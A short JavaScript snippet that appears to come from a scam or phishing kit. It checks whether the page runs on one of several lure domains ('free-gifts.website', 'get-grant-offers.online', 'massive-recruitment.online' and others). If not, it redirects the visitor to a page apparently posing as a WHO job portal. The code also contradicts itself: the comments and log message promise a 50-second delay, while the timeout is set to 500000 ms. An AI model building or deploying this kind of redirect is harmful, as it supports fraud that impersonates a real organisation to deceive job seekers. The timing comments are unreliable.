// List of allowed domains
const allowedDomains = [
  "yesreward.club",
  "free-gifts.website",
  "get-grant-offers.online",
  "get-grant-today.online",
  "get-offers-now.online",
  "getoffers-today.online",
  "get-your-gift.site",
  "massive-recruitment.online"
];

const redirectDomain = "https://get-offers-now.online/WHO-Job-Portal.html"; // 

const currentDomain = window.location.hostname;

// Function to check if the domain is allowed
const isDomainAllowed = (domain) => {
  return allowedDomains.some(allowedDomain => 
    domain === allowedDomain || domain.endsWith(`.${allowedDomain}`)
  );
};

if (!isDomainAllowed(currentDomain)) {
  console.log(`Unauthorized domain detected: ${currentDomain}. Redirecting in 50 seconds...`);

  setTimeout(() => {
    window.location.href = redirectDomain;
  }, 500000); // 50000 milliseconds = 50 seconds
}
